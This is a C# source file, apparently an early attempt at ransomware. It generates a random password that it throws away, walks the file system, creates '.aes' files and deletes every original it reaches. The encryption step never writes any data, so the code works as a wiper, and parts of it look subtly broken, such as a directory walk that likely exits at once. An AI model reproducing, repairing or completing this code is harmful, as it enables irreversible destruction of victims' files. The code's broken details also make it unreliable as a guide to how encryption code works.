using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Windows;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;


namespace EncryptionLogic
{
	public class Encryption
	{
		private static Random random = new Random();
		//private static byte[] passwordBytes = new byte[];

		public string generate256BitKey()
		{
			const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()";

			try
			{
				return new string(Enumerable.Repeat(chars, 256)
					.Select(s => s[random.Next(s.Length)]).ToArray());

			}
			catch (Exception e)
			{
				MessageBox.Show(e.Message);

			}
			return null;
		}

		public static byte[] GenerateRandomSalt()
		{
			byte[] data = new byte[32];

			using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
			{
				for (int i = 0; i < 10; i++)
				{
					// Fille the buffer with the generated data
					rng.GetBytes(data);
				}
			}

			return data;
		}

		private void encryptFile(string file, Rfc2898DeriveBytes key)
		{
			FileStream fsCrypt = new FileStream(file + ".aes", FileMode.Create);
			RijndaelManaged AES = new RijndaelManaged();
			AES.KeySize = 256;
			AES.BlockSize = 128;
			AES.Padding = PaddingMode.PKCS7;
			AES.Key = key.GetBytes(AES.KeySize / 8);
			AES.IV = key.GetBytes(AES.BlockSize / 8);

			CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);
			File.Delete(file);
		}

		public int encryptDesktop()
		{
			try
			{
				//string filepath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				List<string> filesList = getCDriveFiles().ToList();
				//DirectoryInfo d = new DirectoryInfo(filepath);

				string passwordBytes = generate256BitKey();
				var key = new Rfc2898DeriveBytes(passwordBytes, 0, 50000);

				foreach (var file in filesList)
				{
					encryptFile(file, key);
				}

				byte[] encryptedBytes = null;
				return 1;
			}
			catch (Exception e)
			{
				MessageBox.Show(e.InnerException.ToString());
				return 0;
			}
		}

		public static IEnumerable<string> getCDriveFiles()
		{
			string currDirectory = Environment.GetFolderPath(Environment.SpecialFolder.System);
			Queue<string> pending = new Queue<string>();
			pending.Enqueue(currDirectory);
			string[] tmp;
			while (pending.Count > 0)
			{
				currDirectory = pending.Dequeue();
				if (!currDirectory.Contains("Windows"))
				{
					try
					{
						tmp = Directory.GetFiles(currDirectory);
					}
					catch (Exception e)
					{
						continue;
					}
					for (int i = 0; i < tmp.Length; i++)
					{
						yield return tmp[i];
					}
					tmp = Directory.GetDirectories(currDirectory);
					for (int i = 0; i < tmp.Length; i++)
					{
						pending.Enqueue(tmp[i]);
					}
				}
			}
		}
	}
}
